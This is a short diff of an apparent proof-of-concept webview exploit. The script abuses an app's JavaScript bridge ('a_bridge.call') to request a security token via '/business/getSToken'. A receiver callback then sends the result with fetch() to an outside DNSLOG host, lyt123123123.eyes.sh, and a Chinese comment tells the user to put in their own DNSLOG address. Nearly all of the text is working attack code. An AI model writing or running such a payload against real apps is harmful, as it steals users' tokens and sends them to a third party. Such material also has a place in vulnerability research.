@@ -1,7 +1,7 @@
 <script>
 	window.bridgeCore = {
         receiver: function(t, e, a) {
-            fetch("https://lyt123123123.eyes.sh/dns/?data=" + encodeURIComponent(a)) // 回显到你的 DNSLOG 地址
+            fetch("http://lyt123123123.eyes.sh/?data=" + a)
         }
     }
 	a_bridge.call(JSON.stringify({"method":"/business/getSToken","uniqueId":"111111111","params":{"type":2}}))
